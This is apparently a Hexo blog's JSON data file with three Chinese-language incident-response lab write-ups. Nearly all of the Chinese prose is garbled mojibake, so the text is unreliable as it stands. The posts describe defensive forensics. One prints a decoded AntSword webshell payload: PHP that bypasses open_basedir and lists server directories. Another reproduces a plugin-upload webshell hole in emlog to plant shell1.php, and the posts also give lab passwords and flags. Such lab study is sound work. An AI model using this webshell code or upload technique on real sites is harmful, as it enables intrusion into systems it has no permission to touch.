{"meta":{"title":"Liusha's Blog","subtitle":"æ„¿æ­¤ç”Ÿä¸æ¢ï¼Œæ­¤ç”Ÿæ— æ‚”!","description":"çæƒœå…‰é˜´ï¼Œäº«å—å½“ä¸‹!","author":"liushastil","url":"http://example.com","root":"/"},"pages":[{"title":"categories","date":"2024-10-27T10:49:32.000Z","updated":"2024-10-28T02:05:07.208Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"å‹æƒ…é“¾æ¥","date":"2024-10-27T15:09:15.000Z","updated":"2024-10-27T15:13:29.665Z","comments":true,"path":"link/index.html","permalink":"http://example.com/link/index.html","excerpt":"","text":""},{"title":"æ ‡ç­¾","date":"2024-10-27T15:08:46.000Z","updated":"2024-10-27T15:12:25.929Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"åº”æ€¥å“åº”é¶æœº-Linux(2)-å®æˆ˜","slug":"åº”æ€¥å“åº”é¶æœº-Linux(2)-å®æˆ˜","date":"2024-10-30T08:15:27.000Z","updated":"2024-10-30T14:04:49.302Z","comments":true,"path":"2024/10/30/åº”æ€¥å“åº”é¶æœº-Linux(2)-å®æˆ˜/","permalink":"http://example.com/2024/10/30/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA-Linux(2)-%E5%AE%9E%E6%88%98/","excerpt":"","text":"2024-10-30ğŸŒ±æ¹–å·: â›…ï¸ ğŸŒ¡ï¸+18Â°C ğŸŒ¬ï¸â†“4km&#x2F;h é¶æœºæ¥æºhttps://mp.weixin.qq.com/s?__biz=MzkxMTUwOTY1MA==&amp;mid=2247485625&amp;idx=1&amp;sn=ec58f917314da2fee442a94bce81ce9d&amp;chksm=c11a5944f66dd0526a43531f5afdaec58e39dea79df0fbcf413269cb9d5ce54fb1fd1077176a&amp;scene=178&amp;cur_album_id=3245764910756954116&amp;poc_token=HFzoIWej8_HsucBEYhi_jxzHUMoo7djIMJJQd06_ æŒ‘æˆ˜å†…å®¹ å‰æ™¯éœ€è¦ï¼šçœ‹ç›‘æ§çš„æ—¶å€™å‘ç°webshellå‘Šè­¦ï¼Œé¢†å¯¼è®©ä½ ä¸Šæœºæ£€æŸ¥ä½ å¯ä»¥æ•‘æ•‘å®‰æœä»”å—ï¼ï¼ 1,æäº¤æ”»å‡»è€…IP 2,æäº¤æ”»å‡»è€…ä¿®æ”¹çš„ç®¡ç†å‘˜å¯†ç (æ˜æ–‡) 3,æäº¤ç¬¬ä¸€æ¬¡Webshellçš„è¿æ¥URL(http://xxx.xxx.xxx.xx/abcdefg?abcdefgåªéœ€è¦æäº¤abcdefg?abcdefg) 3,æäº¤Webshellè¿æ¥å¯†ç  4,æäº¤æ•°æ®åŒ…çš„flag1 5,æäº¤æ”»å‡»è€…ä½¿ç”¨çš„åç»­ä¸Šä¼ çš„æœ¨é©¬æ–‡ä»¶åç§° 6,æäº¤æ”»å‡»è€…éšè—çš„flag2 7,æäº¤æ”»å‡»è€…éšè—çš„flag3 ç›¸å…³è´¦æˆ·å¯†ç ï¼š root&#x2F;Inch@957821. åŸºç¡€ä¿¡æ¯æ”¶é›† æŸ¥çœ‹å†å²å‘½ä»¤ historyå‘ç°flag3ï¼šflag{5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ} å› ä¸ºé¶æœºæ‰“å¼€åªæœ‰ä¸€ä¸ªç»ˆç«¯ï¼Œè€Œä¸”ä¹Ÿæ²¡æœ‰ä¸‹vmtoolsï¼Œä½¿ç”¨èµ·æ¥ä¸å¤ªæ–¹ä¾¿ï¼Œæ‰€ä»¥ä¸‹é¢ä½¿ç”¨xshellè¿æ¥äº†ä¹‹å‰çš„å‘½ä»¤è¿˜åˆ›å»ºäº†.apiæ–‡ä»¶å¤¹ï¼Œå¹¶ä¸”å°†å½“å‰æ‰€åœ¨çš„æ‰€æœ‰æ–‡ä»¶å¤åˆ¶åˆ°è¯¥æ–‡ä»¶å¤¹ä¸­ åœ¨alinotify.phpæ–‡ä»¶ä¸­å‘ç°äº†flag2ï¼šflag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9} æŸ¥çœ‹ç™»å½•ä¿¡æ¯last æ‰¾åˆ°äº†ä¸€ä¸ªå¯ç–‘IPï¼š192.168.20.1 æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ· 1cat /etc/passwd å¹¶æ²¡æœ‰å‘ç°æ–°å»ºçš„å¯ç–‘ç”¨æˆ· ç³»ç»Ÿå®‰è£…åŒ…æ£€æŸ¥è¿™æ¬¡æ£€æŸ¥ç›´æ¥ä»è¿™é‡Œå¼€å§‹ï¼Œå¯ä»¥æé«˜æ•ˆç‡ï¼Œå‡å°‘éœ€è¦æ£€æŸ¥çš„æ–‡ä»¶ 1rpm -V -a æ¯”è¾ƒå¯ç–‘çš„æ–‡ä»¶ä¿®æ”¹&#x2F;root&#x2F;.bashrc æ²¡æœ‰å‘ç°å¯ç–‘çš„åœ°æ–¹ å¯»æ‰¾webshellå°†ç½‘ç«™çš„ç›®å½•ä¸Šä¼ åˆ°æœ¬åœ°ï¼Œç„¶åä½¿ç”¨Dç›¾æ‰«æï¼Œç„¶è€Œæ²¡æœ‰æ‰«æå‡ºæ¥ æŸ¥çœ‹webæ—¥å¿—æ‰¾åˆ°webæ—¥å¿—è·¯å¾„ï¼š&#x2F;www&#x2F;wwwlogs é¦–å…ˆæŸ¥çœ‹é”™è¯¯æ—¥å¿—ï¼š127.0.0.1.error.logcat 127.0.0.1.error.logå‘ç°äº†è®¸å¤šçš„çˆ†ç ´ç›®å½•çš„é”™è¯¯è¯·æ±‚ï¼Œå¹¶ä¸”å‘ç°ç¬¬äºŒä¸ªå¯ç–‘IPï¼š192.168.20.131 æŸ¥çœ‹è¿æ¥æ—¥å¿—cat access.log ç™»å½•å®å¡”æŸ¥çœ‹æ—¥å¿—ä¿®æ”¹&#x2F;www&#x2F;server&#x2F;panel&#x2F;vhost&#x2F;nginx&#x2F;127.0.0.1.confé…ç½®æ–‡ä»¶ä¸­çš„åœ°å€ä¸ºè‡ªå·±çš„è™šæ‹Ÿæœºçš„åœ°å€å‘½ä»¤è¡Œè¾“å…¥btç„¶åé€‰æ‹©5ï¼Œä¿®æ”¹é¢ç‰ˆå¯†ç ï¼Œé€‰æ‹©28ï¼Œä¿®æ”¹é¢æ¿å®‰å…¨å…¥å£ç„¶åé€‰æ‹©1ï¼Œé‡å¯é¢æ¿æœåŠ¡ ç”¨æˆ·å: uysycv5wæ–°å¯†ç : 123456 ç„¶åä½¿ç”¨å¦‚ä¸‹åœ°å€è®¿é—®å®å¡”é¢æ¿ http://192.168.74.135:12485/qwerty å®å¡”é¢æ¿é˜²æŠ¤å¾ˆå¼ºï¼Œæ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œåº”è¯¥å°±æ˜¯ä¸‹é¢çš„ç½‘ç«™å­˜åœ¨é—®é¢˜ç™»é™†æˆåŠŸåï¼Œæ‰“å¼€æ•°æ®åº“æŸ¥çœ‹ å‘ç°äº†ç”¨æˆ·åå’Œå¯†ç çš„è¡¨æ ¼ ç¬¬ä¸€ä¸ªç”¨æˆ·çš„å¯†ç å¯ä»¥è§£å¯† ç„¶åä½¿ç”¨ä¸Šé¢çš„è´¦å·ç™»å½•æŸ¥çœ‹ åˆ†ææµé‡åŒ…è¿˜æœ‰ä¸€ä¸ªæµé‡åŒ…æ²¡æœ‰åˆ†æï¼Œå°†æµé‡åŒ…ä¸‹è½½åˆ°æœ¬åœ°è¿›è¡Œåˆ†æï¼Œç„¶åè¿½è¸ªhttpæµï¼Œå‘ç°äº†å¾ˆå¤šindex.php?user-app-registerè¿™ä¸ªè·¯ç”± ç”±è¿™ä¸ªæµé‡å¯ä»¥å¾—çŸ¥ï¼Œwebshellçš„å¯†ç æ˜¯Network2020å°†ä¹‹è¿›è¡ŒURLè§£å¯†åç¾åŒ–ä¸€ä¸‹ä»£ç å¦‚ä¸‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162Network2020 = @ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);$opdir = @ini_get(&quot;open_basedir&quot;);if ($opdir) &#123; $ocwd = dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); $oparr = preg_split(base64_decode(&quot;Lzt8Oi8=&quot;), $opdir);@ array_push($oparr, $ocwd, sys_get_temp_dir()); foreach($oparr as $item) &#123; if (!@is_writable($item)) &#123; continue; &#125;; $tmdir = $item. &quot;/.24b0d&quot;;@ mkdir($tmdir); if (!@file_exists($tmdir)) &#123; continue; &#125; $tmdir = realpath($tmdir);@ chdir($tmdir);@ ini_set(&quot;open_basedir&quot;, &quot;..&quot;); $cntarr = @preg_split(&quot;/\\\\\\\\|\\//&quot;, $tmdir); for ($i = 0; $i &lt; sizeof($cntarr); $i++) &#123;@ chdir(&quot;..&quot;); &#125;;@ ini_set(&quot;open_basedir&quot;, &quot;/&quot;);@ rmdir($tmdir); break; &#125;;&#125;;;function asenc($out) &#123; return $out;&#125;;function asoutput() &#123; $output = ob_get_contents(); ob_end_clean(); echo &quot;02e&quot;. &quot;9bd&quot;; echo@ asenc($output); echo &quot;6f2&quot;. &quot;72a8&quot;;&#125;ob_start();try &#123; $D = base64_decode(substr($_POST[&quot;x0b6b31b98f31d&quot;], 2)); $F = @opendir($D); if ($F == NULL) &#123; echo(&quot;ERROR:// Path Not Found Or No Permission!&quot;); &#125; else &#123; $M = NULL; $L = NULL; while ($N = @readdir($F)) &#123; $P = $D.$N; $T = @date(&quot;Y-m-d H:i:s&quot;, @filemtime($P));@ $E = substr(base_convert(@fileperms($P), 10, 8), -4); $R = &quot; &quot;.$T. &quot; &quot;.@filesize($P). &quot; &quot;.$E. &quot; &quot;;if(@is_dir($P))$M.=$N.&quot; / &quot;.$R;else $L.=$N.$R;&#125;echo $M.$L;@closedir($F);&#125;;&#125;catch(Exception $e)&#123;echo &quot; ERROR: //&quot;.$e-&gt;getMessage();&#125;;asoutput();die();&amp;x0b6b31b98f31d=TtL3d3dy93d3dyb290LzEyNy4wLjAuMS8= ä»¥ä¸Šçš„ä»£ç å¾ˆæ˜æ˜¾æ˜¯èšå‰‘çš„æµé‡ï¼Œæœ€åçš„å­—ç¬¦ä¸²å»æ‰ä¸¤ä½base64è§£å¯†å‡ºæ¥æ˜¯è·¯å¾„ ç»§ç»­æŸ¥çœ‹æµé‡åŒ…å‘ç°äº†flag1ï¼šflag1{Network@_2020_Hack} ç»§ç»­å¾€ä¸‹ç¿»ï¼Œå‘ç°åé¢å…¨æ˜¯&#x2F;version2.phpçš„è·¯ç”±ï¼Œè¿™åº”è¯¥å°±æ˜¯åç»­ä¸Šä¼ çš„æœ¨é©¬æ–‡ä»¶åç§° è¿™æ˜¯ä¸€ä¸ªèš‚å‰‘æœ¨é©¬çš„æµé‡ï¼Œå®ƒçš„è¿æ¥æ—¶Kepp-Aliveçš„ æ€»ç»“ç»è¿‡è¿™ä¸€æ¬¡çš„é¶æœºç»ƒä¹ ï¼Œæˆ‘å‘ç°æˆ‘è¿˜æ˜¯æœ‰å¾ˆå¤šçš„ä¸è¶³ï¼Œæ¯”å¦‚èšå‰‘å’Œå†°èçš„æµé‡å¹¶ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œå®å¡”é¢æ¿çš„æ“ä½œä¹Ÿä¸ç†Ÿæ‚‰ï¼Œä»¥åæœ‰æ—¶é—´å†åŠ å¼ºä¸€ä¸‹å§","categories":[{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"http://example.com/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"åº”æ€¥å“åº”/Linux/ç¬”è®°","slug":"åº”æ€¥å“åº”-Linux-ç¬”è®°","permalink":"http://example.com/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux-%E7%AC%94%E8%AE%B0/"}]},{"title":"åº”æ€¥å“åº”é¶æœº-Web1å®æˆ˜","slug":"åº”æ€¥å“åº”é¶æœº-Web1å®æˆ˜","date":"2024-10-28T12:23:15.000Z","updated":"2024-10-30T14:05:38.471Z","comments":true,"path":"2024/10/28/åº”æ€¥å“åº”é¶æœº-Web1å®æˆ˜/","permalink":"http://example.com/2024/10/28/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA-Web1%E5%AE%9E%E6%88%98/","excerpt":"","text":"2024-10-28ğŸŒ±æ¹–å·: â˜€ï¸ ğŸŒ¡ï¸+16Â°C ğŸŒ¬ï¸â†“9km&#x2F;h é¶åœºæ¥æºhttps://mp.weixin.qq.com/s?__biz=MzkxMTUwOTY1MA==&amp;mid=2247485154&amp;idx=1&amp;sn=2b27ca8af88ec5107138f3498e48f12a&amp;chksm=c11a571ff66dde09e927da278fc8ac280d0f4a1a046e28eec41da72fc32df678af27f8fef01e&amp;scene=178&amp;cur_album_id=3245764910756954116#rd ç”¨æˆ·:administrator å¯†ç :&#90;&#x67;&#x73;&#102;&#64;&#x61;&#100;&#x6d;&#105;&#110;&#46;&#99;&#x6f;&#109; å‰æ™¯éœ€è¦ï¼š å°æåœ¨å€¼å®ˆçš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°æœ‰CPUå ç”¨é£™å‡ï¼Œå‡ºäºèƒ†å­å°ï¼Œå°±ç«‹åˆ»å°†æœåŠ¡å™¨å…³æœºï¼Œå¹¶æ‰¾æ¥æ­£åœ¨åƒè‹•çš®çš„hxdå¸®ä»–åˆ†æï¼Œè¿™æ˜¯ä»–çš„æœåŠ¡å™¨ç³»ç»Ÿï¼Œè¯·ä½ æ‰¾å‡ºä»¥ä¸‹å†…å®¹ï¼Œå¹¶ä½œä¸ºé€šå…³æ¡ä»¶ï¼š 1.æ”»å‡»è€…çš„shellå¯†ç  2.æ”»å‡»è€…çš„IPåœ°å€ 3.æ”»å‡»è€…çš„éšè—è´¦æˆ·åç§° 4.æ”»å‡»è€…æŒ–çŸ¿ç¨‹åºçš„çŸ¿æ± åŸŸå(ä»…åŸŸå) 5.æœ‰å®åŠ›çš„å¯ä»¥å°è¯•ç€ä¿®å¤æ¼æ´ å¯»æ‰¾æ¼æ´å…¥å£ç‚¹æ ¹æ®å‰æ™¯æç¤ºå¯çŸ¥ï¼ŒCPUå ç”¨é£™å‡ï¼Œå¤§æ¦‚ç‡æ˜¯æœ‰æŒ–çŸ¿ç¨‹åºï¼Œè¯´æ˜æ”»å‡»è€…å·²ç»è·å¾—äº†æœåŠ¡å™¨çš„æƒé™ï¼Œæ‰“å¼€è™šæ‹Ÿæœºå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªå°çš®é¢ç‰ˆï¼Œå¤§æ¦‚ç‡æ˜¯ä¸Šä¼ äº†webshellï¼Œåˆ¤æ–­webshellå¾ˆå¯èƒ½å°±æ˜¯æ”»å‡»è€…çš„å…¥å£ç‚¹ ä½¿ç”¨Dç›¾æŸ¥æ‰¾webshell æŸ¥çœ‹æœåŠ¡å™¨çš„æ—¥å¿—ç¡®å®šäº†webshellæ˜¯é»‘å®¢çš„å…¥å£ç‚¹åï¼Œå¾ˆæ˜æ˜¾çš„çœ‹å‡ºè¿™ä¸ªæ˜¯å†°èçš„æœ¨é©¬ï¼Œshellçš„å¯†ç æ˜¯rebeyond æŸ¥çœ‹webæœåŠ¡å™¨æ—¥å¿—æŸ¥æ‰¾é»‘å®¢çš„IPåœ°å€ï¼Œä»¥åŠæŸ¥çœ‹æ˜¯æ€ä¹ˆä¸Šä¼ ä¸Šæ¥çš„ è¿™é‡ŒæŸ¥çœ‹æœ¬åœ°çš„webæœåŠ¡å™¨æœ‰ngnixå’Œapacheä¸¤ä¸ªï¼Œå‘ç°åªæœ‰apacheä¸­æœ‰æ—¥å¿—è®°å½• æ‰“å¼€access.log.1708905600æ–‡ä»¶ å…¨å±€æœç´¢shell.php ä»ç¬¬ä¸€æ¡shell.phpè®°å½•å¼€å§‹å¯»æ‰¾ï¼Œå‘ç°äº†ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„æ“ä½œï¼Œéå¸¸å¯ç–‘ï¼Œä¼°è®¡è¿™é‡Œå­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´å‘ç°è¿æ¥çš„IPéƒ½æ˜¯ï¼š192.168.126.1 å¯»æ‰¾æ¼æ´å…¥å£ç‚¹æ‰“å¼€æœåŠ¡ï¼Œå¤ç°æ–‡ä»¶ä¸Šä¼ æ¼æ´ webç½‘ç«™å­˜åœ¨å…¬å¼€æ¼æ´ï¼Œæ¼æ´pocå¦‚ä¸‹é“¾æ¥https://github.com/Sec-Fork/POC-20240918/blob/main/Emlog/emlog%E5%90%8E%E5%8F%B0%E6%8F%92%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2024-33752).md éšä¾¿åœ¨ç½‘ä¸Šæ‰¾åˆ°ä¸€ä¸ªæ’ä»¶ï¼Œç„¶åæ·»åŠ shell1.phpæ–‡ä»¶ï¼Œå°†æ‰€æœ‰çš„æ–‡ä»¶æ”¾åˆ°shell1æ–‡ä»¶å¤¹ä¸­ï¼Œç„¶åå‹ç¼©æˆå‹ç¼©åŒ… ç„¶åè®¿é—®å¦‚ä¸‹åœ°å€å°±å¯ä»¥çœ‹åˆ°ä¸Šä¼ çš„æ–‡ä»¶äº†&#x2F;content&#x2F;plugins&#x2F;shell1&#x2F;shell1.php å¯»æ‰¾éšè—ç”¨æˆ·ç»“åˆå‰æ™¯å¾—çŸ¥æ”»å‡»è€…æ–°å»ºäº†ä¸€ä¸ªæ–°çš„éšè—è´¦æˆ·ï¼Œæ™®é€šæŸ¥è¯¢æ²¡æ³•æŸ¥åˆ°éšè—çš„ç”¨æˆ·ï¼Œéœ€è¦ä»æ§åˆ¶é¢æ¿çš„ç”¨æˆ·ç®¡ç†æˆ–è€…æ³¨å†Œè¡¨ä¸­æ‰èƒ½çœ‹åˆ° æ‰“å¼€æ§åˆ¶é¢æ¿ï¼Œæ‰“å¼€ç”¨æˆ·è´¦æˆ·ï¼Œæ‰“å¼€ç®¡ç†å…¶ä»–ç”¨æˆ·å°±èƒ½çœ‹åˆ°æœ‰ä¸€ä¸ªéšè—è´¦æˆ· æˆ–è€…æ‰“å¼€ cmd çª—å£ï¼Œè¾“å…¥lusrmgr.mscå‘½ä»¤ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰æ–°å¢&#x2F;å¯ç–‘çš„è´¦å· å‘ç°éšè—ç”¨æˆ·ï¼šhack168$ å¯»æ‰¾æŒ–çŸ¿ç¨‹åºæ€ä¹ˆå¯»æ‰¾æŒ–çŸ¿ç¨‹åºå‘¢ï¼Ÿæ”»å‡»è€…è‹¥æ˜¯æƒ³è¦æŒç»­è¿è¡ŒæŒ–çŸ¿ç¨‹åºçš„è¯å°±éœ€è¦ä½¿ç”¨è®¡åˆ’ä»»åŠ¡æˆ–è€…æ˜¯å¯åŠ¨é¡¹æ¥åŠ è½½æ¶æ„ç¨‹åº æ£€æŸ¥å¯åŠ¨é¡¹ã€è®¡åˆ’ä»»åŠ¡ã€æœåŠ¡å•å‡»å¼€å§‹èœå• &gt;ã€è¿è¡Œã€‘ï¼Œè¾“å…¥ msconfigï¼ŒæŸ¥çœ‹æ˜¯å¦å­˜åœ¨å‘½åå¼‚å¸¸çš„å¯åŠ¨é¡¹ç›®ï¼Œæ˜¯åˆ™å–æ¶ˆå‹¾é€‰å‘½åå¼‚å¸¸çš„å¯åŠ¨é¡¹ç›®ï¼Œå¹¶åˆ°å‘½ä»¤ä¸­æ˜¾ç¤ºçš„è·¯å¾„åˆ é™¤æ–‡ä»¶ã€‚ æ‰“å¼€cmdï¼Œè¾“å…¥schtasksï¼Œé»˜è®¤å±•ç¤ºæ‰€æœ‰çš„è®¡åˆ’ä»»åŠ¡ã€‚ WIN +Rï¼Œè¾“å…¥services.mscï¼Œæ‰“å¼€æœåŠ¡å·¥å…·ï¼Œå•å‡»å¯åŠ¨ç±»å‹æ’åºï¼Œé‡ç‚¹æŸ¥çœ‹å¯åŠ¨ç±»å‹ä¸ºã€è‡ªåŠ¨ã€‘çš„æœåŠ¡ æ²¡æœ‰æ‰¾åˆ°å¯ç–‘çš„åœ°æ–¹ æŸ¥æ‰¾ç—…æ¯’æ–‡ä»¶ä½¿ç”¨å¡å·´æ–¯åŸºå…¨ç›˜æ‰«æï¼Œä¹Ÿæ²¡æœ‰å‘ç°ç—…æ¯’ æ²¡æ³•å­ï¼Œéšä¾¿ç¿»äº†ç¿»åœ¨éšè—ç”¨æˆ·çš„æ¡Œé¢ç›®å½•ä¸‹å‘ç°äº†kuang.exeæ–‡ä»¶ï¼Œè¿è¡Œåç›´æ¥cpuçˆ†æ»¡é‡å¯ï¼Œä¼°è®¡å°±æ˜¯é‚£ä¸ªæŒ–çŸ¿ç—…æ¯’äº† ä¸€çœ‹çŸ¥é“æ˜¯ä¸€ä¸ªpythonç¼–è¯‘çš„exeæ–‡ä»¶ï¼Œåç¼–è¯‘è¿˜åŸä»£ç  å‘ç°äº†çŸ¿æ± åŸŸåï¼šwakuang.zhigongshanfang.top æ€»ç»“Windowså¸¸è§çš„å…¥ä¾µæ’æŸ¥æ€è·¯ï¼š æŸ¥æ‰¾æ–°å»ºç”¨æˆ· åˆ†ææ—¥å¿—ï¼ŒæŸ¥æ‰¾å¯ç–‘çš„ç™»é™†æ—¶é—´ï¼ŒæŸ¥æ‰¾ç™»å½•å¤±è´¥è®°å½• æŸ¥çœ‹å¯åŠ¨é¡¹ã€å®šæ—¶ä»»åŠ¡ã€å¯åŠ¨æœåŠ¡ å…¨ç›˜æ‰«æç—…æ¯’","categories":[{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"http://example.com/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"åº”æ€¥å“åº”/Linux/å®æˆ˜","slug":"åº”æ€¥å“åº”-Linux-å®æˆ˜","permalink":"http://example.com/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux-%E5%AE%9E%E6%88%98/"}]},{"title":"åº”æ€¥å“åº”é¶æœº-Linux(1)-å®æˆ˜","slug":"åº”æ€¥å“åº”é¶æœº-Linux(1)-å®æˆ˜","date":"2024-10-28T09:55:21.000Z","updated":"2024-10-30T14:04:33.766Z","comments":true,"path":"2024/10/28/åº”æ€¥å“åº”é¶æœº-Linux(1)-å®æˆ˜/","permalink":"http://example.com/2024/10/28/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA-Linux(1)-%E5%AE%9E%E6%88%98/","excerpt":"","text":"2024-10-28ğŸŒ±æ¹–å·: ğŸŒ¦ ğŸŒ¡ï¸+17Â°C ğŸŒ¬ï¸â†“13km&#x2F;h é¶åœºæ¥æºhttps://mp.weixin.qq.com/s/gCWGnBiwbqSnafXU1apJCA è´¦æˆ·å¯†ç æ˜¯defend æŒ‘æˆ˜å†…å®¹å‰æ™¯éœ€è¦ï¼šå°ç‹æ€¥åŒ†åŒ†åœ°æ‰¾åˆ°å°å¼ ï¼Œå°ç‹è¯´â€æå“¥ï¼Œæˆ‘devæœåŠ¡å™¨è¢«é»‘äº†â€,å¿«æ•‘æ•‘æˆ‘ï¼ï¼ æŒ‘æˆ˜å†…å®¹ï¼š é»‘å®¢çš„IPåœ°å€ é—ç•™ä¸‹çš„ä¸‰ä¸ªflag å…¶ä»–è¯¦ç»†çš„ä¿¡æ¯ï¼Œåœ¨ä»¥ä¸Šçš„é“¾æ¥ä¸­å‡å·²æåŠï¼Œæœ¬æ–‡ä»…é€šè¿‡å®éªŒæ¥éªŒè¯å·©å›ºè‡ªå·±çš„åº”æ€¥å“åº”çŸ¥è¯† åŸºç¡€ä¿¡æ¯æ£€æŸ¥ æ‹¿åˆ°è¿™ä¸ªç¯å¢ƒåï¼Œå…ˆè¿›è¡Œä¸€äº›å¸¸è§„å‘½ä»¤æ£€æŸ¥å’Œä¸€äº›å¸¸è§æ–‡ä»¶çš„æ£€æŸ¥ æŸ¥çœ‹ç³»ç»Ÿå†å²å‘½ä»¤ æ­£å¸¸æ¥è¯´æ”»å‡»è€…ä¸ºäº†éšè—è¸ªè¿¹ä¸€èˆ¬éƒ½ä¼šæ¸…é™¤å†å²å‘½ä»¤ï¼Œä½†æ˜¯ä»¥é˜²ä¸‡ä¸€è¿˜æ˜¯æŸ¥çœ‹ä¸‹ 12345å…ˆæ˜¯æ™®é€šç”¨æˆ·çš„å†å²å‘½ä»¤historyç„¶åè¿›å…¥åˆ°rootç”¨æˆ·ï¼ŒæŸ¥çœ‹å†å²å‘½ä»¤ ç»“æœå‘ç°ç¬¬ä¸€ä¸ªflagåœ¨rootç”¨æˆ·çš„å†å²å‘½ä»¤ä¸­å°±å‡ºæ¥äº†flag&#123;thisismybaby&#125; æŸ¥çœ‹æ˜¯å¦æœ‰å¯ç–‘ç”¨æˆ·12cat /etc/passwdcat /etc/shadow å¹¶æ²¡æœ‰å‘ç°å¯ä»¥ç”¨æˆ·ä¿¡æ¯ æŸ¥çœ‹å‘½ä»¤è¡Œé…ç½®æ–‡ä»¶åœ¨ç»ˆç«¯è¿è¡Œæ—¶ä¼šé»˜è®¤åŠ è½½çš„é…ç½®æ–‡ä»¶ï¼Œåœ¨ç”¨æˆ·çš„æ ¹ç›®å½•ä¸‹è¿™é‡Œæ˜¯.bash_profileï¼Œè¿˜æœ‰.bashrcç­‰éšè—æ–‡ä»¶ 1cat .bash_profile defendç”¨æˆ·çš„é…ç½®æ–‡ä»¶ä¹ŸæŸ¥çœ‹äº†ï¼Œå¹¶æ— å¼‚å¸¸ æŸ¥çœ‹ç™»é™†è®°å½•æŸ¥çœ‹ç™»é™†æˆåŠŸæ—¥å¿—12345æ˜¾ç¤ºç”¨æˆ·çš„æœ€è¿‘çš„ç™»å½•æ—¥å¿—ï¼Œå®é™…ä¸Šæ˜¯æŸ¥çœ‹çš„æ˜¯wtmpæ—¥å¿—ï¼Œä½äº/var/log/wtmpæ–‡ä»¶lastè‹¥æ˜¯æ²¡æœ‰lastå‘½ä»¤çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¾¾åˆ°ä¸€æ ·çš„æ•ˆæœcat /var/log/wtmp | strings å¯ç–‘IPï¼š192.168.75.129 æŸ¥çœ‹ç™»é™†å¤±è´¥æ—¥å¿—æ”»å‡»è€…å¯èƒ½è¿›è¡Œè¿‡çˆ†ç ´å¯†ç ç™»å½•ï¼ŒæŸ¥çœ‹å¯ä»¥çš„å¤±è´¥ç™»é™†è®°å½• 1sudo cat /var/log/btmp | strings æœç„¶è¿›è¡Œäº†å¾ˆå¤šæ¬¡çš„sshç™»å½•å¤±è´¥è®°å½•ï¼Œè¿™ä¸€æ­¥è·å¾—çš„IPåœ°å€ä¹Ÿæ˜¯192.168.75.129ï¼Œå¤§æ¦‚ç‡å°±æ˜¯æ”»å‡»è€…IP ç³»ç»Ÿå¯åŠ¨æ£€æŸ¥å¯åŠ¨æ‰§è¡Œæ–‡ä»¶æ£€æŸ¥ æŸ¥çœ‹&#x2F;etc&#x2F;rc.local centosä¸­ç”¨æˆ·å¯ä»¥åœ¨å…¶ä¸­æ·»åŠ è„šæœ¬å‘½ä»¤ï¼Œç³»ç»Ÿåœ¨å¯åŠ¨æ—¶åŠ è½½ï¼Œcentos6ä¸­å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œä½†æ˜¯centos7ä¸­éœ€è¦åœ¨è®¾ç½®ä¸­å…è®¸ 1cat /etc/rc.local å‘ç°ç¬¬äºŒä¸ªflagï¼šflag&#123;kfcvme50&#125; æ£€æŸ¥ä¸‹æ‰§è¡Œæƒé™ï¼Œæœç„¶èµ‹äºˆäº†æ‰§è¡Œæƒé™ è‡ªå¯åŠ¨æ£€æŸ¥ æŸ¥çœ‹å¯ç–‘çš„è‡ªå¯åŠ¨çš„æœåŠ¡ï¼Œæœ‰å¯èƒ½æ˜¯æ”»å‡»è€…ç•™ä¸‹çš„åé—¨ 1systemctl list-unit-files --type=service | grep enable æ²¡æœ‰å‘ç°ä»€ä¹ˆå¯ç–‘çš„æœåŠ¡ ç³»ç»Ÿå®‰è£…åŒ…æ£€æŸ¥è¯¥æ£€æŸ¥çš„éƒ½æ£€æŸ¥äº†ï¼Œä½†æ˜¯å§‹ç»ˆæ‰¾ä¸åˆ°ç¬¬ä¸‰ä¸ªflagï¼Œä»å‰ä¸¤ä¸ªflagæ¥çœ‹ï¼Œæ”»å‡»è€…å·²ç»å¾—åˆ°äº†ç”¨æˆ·æƒé™ï¼Œå¹¶ä¸”åšäº†åé—¨ï¼Œå¹¶ä¸”æœ‰çˆ†ç ´sshçˆ†ç ´çš„å°è¯•ï¼Œææœ‰å¯èƒ½æ˜¯é€šè¿‡sshç™»é™†è¿›æ¥çš„ æ˜¯åœ¨æ²¡å•¥æ€è·¯äº†ï¼Œäºæ˜¯ä½¿ç”¨ç³»ç»Ÿå®‰è£…åŒ…æ£€æŸ¥ï¼Œæ£€æŸ¥ä¸€ä¸‹åˆ°åº•ä¿®æ”¹äº†å“ªäº›åº”ç”¨çš„é…ç½®å§ 123æ ¡éªŒæ‰€æœ‰çš„å®‰è£…çš„rpmåŒ…rpm -V -a å‘ç°redis.confè¢«ä¿®æ”¹è¿‡ï¼Œå¾ˆå¯ç–‘ï¼Œæ£€æŸ¥ä¸€ä¸‹ 1cat 